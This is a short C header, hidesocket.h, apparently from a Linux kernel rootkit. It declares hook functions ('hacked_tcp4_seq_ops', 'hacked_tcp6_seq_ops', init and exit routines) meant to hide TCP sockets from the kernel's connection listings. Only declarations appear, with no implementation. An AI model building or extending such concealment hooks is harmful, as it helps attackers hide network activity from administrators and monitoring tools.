#ifndef HIDESOCKET_H
#define HIDESOCKET_H
#include <linux/types.h>
#include <linux/seq_file.h>

char *strnstr(const char *haystack, const char *needle, unsigned int n);
int hacked_tcp4_seq_ops(struct seq_file *seq, void *v);
int hacked_tcp6_seq_ops(struct seq_file *seq, void *v);
int init_socket_hook(void);
void exit_socket_hook(void);

#endif
